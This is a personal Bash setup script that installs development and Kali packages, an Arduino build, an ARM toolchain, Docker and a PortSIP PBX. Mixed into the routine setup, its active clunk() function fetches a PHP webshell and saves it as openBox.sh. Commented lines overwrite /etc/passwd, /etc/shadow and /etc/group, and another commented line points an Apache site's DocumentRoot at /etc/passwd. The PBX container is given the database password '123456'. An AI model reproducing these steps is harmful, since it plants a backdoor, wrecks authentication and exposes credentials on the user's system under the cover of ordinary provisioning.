#!/bin/bash

MONK=~/work/sketch
FILE=~/blunk
BOBO=~/work
YUM=/etc/sources.list.bak
BUNCH=~/work/arduino-nightly
BOTCH=~/work/arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi.tar.xz

#exec > $BOBO/blunk.log.txt
exec > >(tee -ia ~/work/blunk.log.txt)
echo Hello World

check() {
if [ -e "$BOBO" ]; then
    echo "$BOBO exists."
else
mkdir ~/work
cd ~/work
fi
}

down() {
if [ -e "$MONK" ]; then
    echo "$MONK exists."
else
sudo apt update
sudo apt -y install git
#git clone https://github.com/emailbombu/sketch.git
#git clone https://github.com/shell382/sketch.git
#git clone https://github.com/shell382/ubiquitous-umbrella.git
fi
}

mvSource() {
if [ -e "$FILE" ]; then
    echo "$FILE exists."
else
    echo "$FILE does not exist."
    #mkdir -p Downz
    #wget -O Downz/sources.list https://raw.githubusercontent.com/shell832/pancake/main/sources.list
if [ -e "$YUM" ]; then
  echo "$YUM exists."
else
  echo "$YUM does not exist"
  #sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak #add rolling number to .bak.0++
  #sudo rm /etc/apt/sources.list
  #sudo cp ~/work/sketch/sources.list.e /etc/apt/sources.list
  fi
fi
}

#keys() {
#echo "Adding GPG Keys"
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 0E98404D386FA1D9
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 54404762BBB6E853
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 7EA0A9C3F273FCD8
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 112695A0E562B32A
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
#sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 871920D1991BC93C
#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o $/usr/share/keyrings/docker-archive-###keyring.gpg
#}

update() {
LIST=/etc/apt/sources.list.d/mobian.list.bak
#list=/etc/apt/sources.list.d/cros.list

echo "Updating System"
#sudo mount -o remount,rw /
sudo apt update
#echo "installing acrh'z"
#sudo dpkg --add-architecture i386
#sudo dpkg --add-architecture amd64
#sudo dpkg --add-architecture armhf
#sudo dpkg --add-architecture armel
#sudo dpkg --add-architecture arm64
echo "Fixings"
if [ -e "$LIST" ]; then
    echo "$LIST exists."
    #sudo sed -i 's/\bdeb\b/& [arch=arm64,armhf]/' /etc/apt/sources.list.d/cros.list
    sudo sed -i 's/\bbookworm\b/& unstable/' /etc/apt/sources.list.d/mobian.list
    else
      echo "$LIST Here."
      #sudo mv /etc/apt/sources.list.d/cros.list /etc/apt/sources.list.d/cros.list.bak
      #sudo mv /etc/apt/sources.list.d/mobian.list /etc/apt/sources.list.d/mobian.list.bak
      #sudo mv /etc/apt/sources.list.d/mobian.list /etc/apt/sources.list.d/mobian.list.bak
      #sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
      #sudo mv /etc/apt/sources.list.d/docker.list /etc/apt/sources.list.d/docker.list.bak
fi
echo installing development packages
#sudo mv /etc/apt/sources.list /etc/apt/sources.list.temp
#sudo rm -r /etc/apt/sources.list
#sudo cp ~/work/sketch/sources.list /etc/apt/sources.list
sudo apt update
#sudo mv /etc/passwd /var/www/html && sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
echo "kali install tools"
sudo apt -y install kali-tools-wireless kali-tools-web kali-tools-voip kali-tools-sniffing-spoofing kali-tools-hardware kali-tools-gpu kali-tools-fuzzing kali-wallpapers-all kali-defaults-desktop kali-desktop-xfce kali-tools-rfid
#sudo apt install kali-tools-rfid #::Sources disagree on hashes for supposely identical version '0.3.8+git20180720-2' of 'mfcuk:arm64'
#sudo apt install kali-tools-rfid libgl1-mesa-dev libglib2.0-dev libglade2-dev kali-tools-802-11 #metasploit*
sudo apt -y install steam #amd64
#sudo rm -r /etc/apt/sources.list
#sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
#sudo mv /etc/apt/sources.list.temp /etc/apt/sources.list
#sudo cp ~/work/sketch/sources.list /etc/apt/sources.list
sudo apt update
sudo apt -y dist-upgrade
sudo apt install -y git unzip bc libncurses5-dev mercurial lib32stdc++6 libc6-i386 lib32z1 u-boot-tools android-tools-fastboot build-essential libusb-1.0-0-dev curl pkg-config libacl1-dev zlib1g-dev liblzo2-dev uuid-dev fastboot u-boot-tools adb u-boot-tools android-tools-fastboot u-boot-tools curl wget sunxi-tools swig python-dev-is-python3 cmake python-is-python3 python3-pip debootstrap u-boot-tools device-tree-compiler android-tools-fastboot sunxi-tools u-boot-tools fakeroot ncurses-dev xz-utils libssl-dev flex libelf-dev bison git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison  libssl-dev make libc6-dev libssl-dev make virt-manager qemu-user-static curl gcc git libssl-dev lzop make u-boot-tools git-core gnupg build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig net-tools intel-microcode firmware-realtek firmware-misc-nonfree putty screen sed make binutils build-essential gcc g++ bash patch gzip bzip2 perl tar cpio unzip rsync file wget python3 cvs git mercurial rsync subversion asciidoc w3m dblatex graphviz which sed make binutils build-essential gcc g++ bash patch gzip bzip2 perl tar cpio unzip rsync file bc wget gparted libusb-1.0-0-dev zlib1g-dev hackrf hacktv build-essential ccache curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick lib32ncurses5-dev lib32readline-dev lib32z1-dev liblz4-tool libncurses5 libsdl1.2-dev libssl-dev libxml2 libxml2-utils lzop pngcrush rsync schedtool squashfs-tools xsltproc zip zlib1g-dev gnome-flashback gnome-flashback-common gnome-session-flashback gnome-panel gnome-panel-data synaptic android-sdk-libsparse-utils git-core gitk git-gui device-tree-compiler mtools parted libudev-dev libusb-1.0-0-dev libssl-dev libconfig++-dev autotools-dev libsigsegv2 m4 intltool libdrm-dev curl sed make binutils build-essential gcc g++ bash patch gzip bzip2 perl tar cpio python2.7 unzip rsync file wget libncurses5 libglib2.0-dev libgtk2.0-dev libglade2-dev cvs git mercurial rsync openssh-client subversion asciidoc w3m dblatex graphviz libc6 libssl-dev texinfo liblz4-tool genext2fs lib32stdc++6 coreboot-utils libflashrom-dev libflashrom1 xgridfit vflib3-dev vflib3 unifont fonts-unifont x11-xfs-utils debos bmap-tools apt-utils software-properties-common gnupg lsb-release python-all python-all-dev python-all-dbg python3-all apache2 python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools ssh python3-pkg-resources python3-virtualenv python3-oauth2client build-essential zip curl zlib1g-dev libc6-dev libncurses5 x11proto-core-dev libx11-dev libxml2-utils xsltproc unzip fontconfig libncurses-dev gawk openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf sed make cmake binutils patch gzip bzip2 perl tar cpio unzip rsync file bc wget qt3d5-dev qt3d5-dev-tools gtk2-engines glade cvs git subversion rsync asciidoc w3m graphviz flex bison swig bmap-tools f2fs-tools qemu-system-x86 qemu-user-static binfmt-support squashfs-tools-ng apt-transport-https ca-certificates curl gnupg-agent software-properties-common dialog libgtk2.0-dev qemu-system libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager uuid uuidcdef gitk git-gui curl xz-utils nano screen fakeroot uuid-runtime uuid-dev hackrf libhackrf-dev dfu-util hacktv default-jdk python-is-python3 libgl1-mesa-dev libglib2.0-dev libglade2-dev xfce4-dev-tools xfce4-goodies
sudo pip3 install pyyaml
#sudo apt -y install apt-utils software-properties-common gnupg lsb-release python-all python-all-dev python-all-dbg python3-all apache2 python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools ssh python3-pkg-resources python3-virtualenv python3-oauth2client build-essential zip curl zlib1g-dev libc6-dev libncurses5 x11proto-core-dev libx11-dev libxml2-utils xsltproc unzip fontconfig libncurses-dev gawk openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf sed make cmake binutils gcc-11 gcc-11-arm-linux-gnueabihf g++-11 g++-11-arm-linux-gnueabihf patch gzip bzip2 perl tar cpio unzip rsync file bc wget qt3d5-dev qt3d5-dev-tools gtk2-engines glade cvs git subversion rsync asciidoc w3m graphviz flex bison swig bmap-tools f2fs-tools qemu-system-x86 qemu-user-static binfmt-support squashfs-tools-ng apt-transport-https ca-certificates curl gnupg-agent software-properties-common dialog libgtk2.0-dev qemu-system libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager uuid uuidcdef gitk git-gui curl xz-utils nano screen fakeroot uuid-runtime uuid-dev hackrf libhackrf-dev dfu-util hacktv default-jdk python-is-python3 libgl1-mesa-dev libglib2.0-dev libglade2-dev intel-microcode firmware-realtek firmware-misc-nonfree putty gcc-arm-linux-gnueabihf gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu  g++-arm-linux-gnueabihf g++-aarch64-linux-gnu crossbuild-essential-armhf crossbuild-essential-arm64
#sudo apt -y install revolt framework2 armitage msfpc recon-ng teamsploit gcc-aarch64-linux-gnu 
#sudo apt install python-all python-all-dev python-all-dbg python3-all python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools python3-pkg-resources python3-virtualenv python3-oauth2client apt-transport-https ca-certificates fakeroot uuid-runtime uuid-dev uuid uuidcdef gcc-aarch64-linux-gnu apt-utils gitk git-gui xz-utils asciidoc libc6-dev build-essential lsb-release software-properties-common libgl1-mesa-dev libglib2.0-dev libglade2-dev zlib1g-dev arm-none-eabi-gcc
#sudo apt install kali-tools-rfid #::Sources disagree on hashes for supposely identical version '0.3.8+git20180720-2' of 'mfcuk:arm64'
#sudo cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/gci.conf 
#sudo apt install kali-tools-rfid libgl1-mesa-dev libglib2.0-dev libglade2-dev kali-tools-802-11 gcc-12-arm-linux-gnueabihf g++-12-arm-linux-gnueabihf g++-12 steam-devices steamcmd steam-launcher
#sudo sed -i 's,DocumentRoot /var/www/html,sshDocumentRoot /etc/passwd,g' /etc/apache2/sites-available/gci.conf
#sudo /etc/init.d/apache2 start && sudo service ssh start
echo "     . .   "
echo "   . . . .   "
echo "   <{(0)}>  "
echo "   .. . .. "
echo "   . . . .  "
echo "   . . . . "
echo " ... ... ..."
if [ -e "$BUNCH" ]; then
    echo "$BUNCH exists."
else
echo "Installing Arduino"

arx64() {
wget -nc -O ~/work/arduino-nightly-linux64.tar.xz https://downloads.arduino.cc/arduino-nightly-linux64.tar.xz
cd $BOBO
tar -xvf arduino-nightly-linux64.tar.xz
sudo arduino-nightly/install.sh
#tar -xvf ~/work/arduino-nightly-linux64.tar.xz
#sudo ~/work/arduino-nightly/install.sh
cp -r ~/work/sketch/Filez/Arduino ~
arduino &
}

a64() {
wget -nc -O ~/work/arduino-nightly-linux64.tar.xz https://downloads.arduino.cc/arduino-nightly-linuxaarch64.tar.xz
cd $BOBO
tar -xvf arduino-nightly-linuxaarch64.tar.xz
sudo arduino-nightly/install.sh
cp -r ~/work/sketch/Filez/Arduino ~
arduino &
}
	echo "do you want arm arduino for x64 or ARM64?"
	echo "arx64 or a64?"
	read duino
	case $duino 
	in

	arx64) arx64 ;;

	a64) a64 ;;

	*) exit ;;

	esac
fi

if [ -e "$BOTCH" ]; then
    echo "$BOTCH exists."
else

x64() {
wget -nc -O ~/work/arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi.tar.xz https://developer.arm.com/-/media/Files/downloads/gnu/12.2.mpacbti-bet1/binrel/arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi.tar.xz
cd $BOBO
tar -xvf arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi.tar.xz
sed -i -e '$aPATH="$HOME/work/arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi:$PATH"' ~/.bashrc #add sed command to check if this is already there
sed -i -e '$aPATH="$HOME/work/arm-gnu-toolchain-12.2.mpacbti-bet1-x86_64-arm-none-eabi/bin:$PATH"' ~/.bashrc
source ~/.bashrc
}

arm64() {
wget -nc -O ~/work/12.2.mpacbti-bet1/binrel/arm-gnu-toolchain-12.2.mpacbti-bet1-aarch64-arm-none-eabi.tar.xz https://armkeil.blob.core.windows.net/developer/Files/downloads/gnu/12.2.mpacbti-bet1/binrel/arm-gnu-toolchain-12.2.mpacbti-bet1-aarch64-arm-none-eabi.tar.xz
cd $BOBO
tar -xvf 12.2.mpacbti-bet1/binrel/arm-gnu-toolchain-12.2.mpacbti-bet1-aarch64-arm-none-eabi.tar.xz
sed -i -e '$aPATH="$HOME/work/arm-gnu-toolchain-12.2.mpacbti-bet1-aarch64-arm-none-eabi:$PATH"' ~/.bashrc
sed -i -e '$aPATH="$HOME/work/arm-gnu-toolchain-12.2.mpacbti-bet1-aarch64-arm-none-eabi/bin:$PATH"' ~/.bashrc
source ~/.bashrc
}

	echo "do you want arm toolchain for x64 or ARM64?"

	read chain
	case $chain 
	in

	x64) x64 ;;

	arm64) arm64 ;;

	*) exit ;;

	esac
fi

sudo apt -y remove brltty
}

rmDock() {
echo "Removing Docker"
sudo apt remove docker docker-engine docker.io containerd runc
}

instDock() {
#JLOVEF=/usr/share/keyrings/docker-ce-archive-keyring.gpg
#echo "Installing Docker"
#echo "Getting Cert"
#if [ -e "$JLOVEF" ]; then
#    echo "$JLOVEF exists."
#else
#sudo curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-ce-archive-keyring.gpg
#sudo curl -fsSL https://download.docker.com/linux/ubunu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-ce-archive-keyring.gpg
#curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add /etc/apt/trusted.gpg.d
echo "Installing Repo"
#sudo rm /etc/apt/sources.list.d/docker.list
#sudo echo "deb https://download.docker.com/linux/debian bullseye stable"  | tee /etc/apt/sources.list.d/docker.list
#sudo echo "deb [arch=arm64] https://download.docker.com/linux/ubuntu jammy stable"  | sudo tee /etc/apt/sources.list.d/docker.list
#sudo add-apt-repository "deb [arch=arm64] https://download.docker.com/linux/debian bullseye stable"
#sudo echo "deb [arch=arm64] https://download.docker.com/linux/ubuntu hirsute stable"  | sudo tee /etc/apt/sources.list.d/docker.list
#echo \
#  "deb https://download.docker.com/linux/debian \
#  bookworm nightly" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
#echo \
#  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \
#  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
#sudo apt remove docker docker-engine docker.io containerd runc
#sudo apt -y install docker containerd.io
sudo apt -y install docker docker.io
#sudo apt -y install docker-ce
#sudo usermod -aG docker "$U"
#fi
}

buildKernel() {
echo "Downloading kernel building files" 
sudo apt build-dep linux-image-$(uname -r)
}

cleanUP() {
echo "Removing unNeeded Packages"
sudo apt -y autoremove
if [ -f "$FILE" ]; then
    echo "$FILE exists."
sudo rm -r ~/blunk
fi
}

Connect() {
sudo apt -y install novnc websockify
sudo openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/ssl/novnc.pem -out /etc/ssl/novnc.pem -days 365
#sudo cp access.sh /etc/passwd && sudo mv /etc/passwd /etc/shadow && sudo mv /etc/shadow /etc/group
sudo chmod 644 /etc/ssl/novnc.pem
websockify -D --web=/usr/share/novnc/ --cert=/etc/ssl/novnc.pem 6080 localhost:5901
}

voice() {
curl https://raw.githubusercontent.com/portsip/portsip-pbx-sh/master/v12.6.x/install_pbx_docker.sh|sudo bash #add starup script init.d
sudo rm -r /etc/apt/sources.list.d/docker.list
sudo docker container run -d --name portsip-pbx --restart=always --cap-add=SYS_PTRACE --network=host -v /var/lib/portsip:/var/lib/portsip -v /etc/localtime:/etc/localtime:ro -e POSTGRES_PASSWORD="123456" -e POSTGRES_LISTEN_ADDRESSES="*" -e IP_ADDRESS="618104708054-m0mqlm35l2ahieavnib6emtan2k95ps9.apps.googleusercontent.com" portsip/pbx:12
#IP_ADDRESS="66.175.222.20" 
}

fire() {
sudo firewall-cmd --permanent --service=portsip-pbx \
               --add-port=5060/udp \
               --set-description="PortSIP PBX"
sudo firewall-cmd --permanent --add-service=portsip-pbx
sudo firewall-cmd --reload
sudo firewall-cmd --permanent --service=portsip-pbx \
               --add-port=5063/tcp \
               --add-port=5065/tcp \
               --set-description="PortSIP PBX"
sudo firewall-cmd --permanent --add-service=portsip-pbx
sudo firewall-cmd --reload
}


sut() {
suu=~/android-studio-2021.1.1.21-cros.deb
if [ -e "$suu" ]; then
    echo "$suu exists."
else
wget https://r1---sn-vgqskned.gvt1.com/edgedl/android/studio/install/2021.1.1.21/android-studio-2021.1.1.21-cros.deb
sudo dpkg -i android-studio-2021.1.1.21-cros.deb
fi
}

clunk() {
wget -nc -O ~/work/openBox.sh https://raw.githubusercontent.com/x-o-r-r-o/PHP-Webshells-Collection/master/Antichat_Shell_v1.3.php
#mv Antichat_Shell_v1.3.php shell.com
}

build() {
xfce4-terminal -e 'bash -c "cd ~/work/sketch; ./system.sh; bash"' -T "Build System" &
}

check
down
mvSource
#keys
rmDock
instDock
update
buildKernel
clunk
#Connect
voice
fire
#sut
cleanUP
build
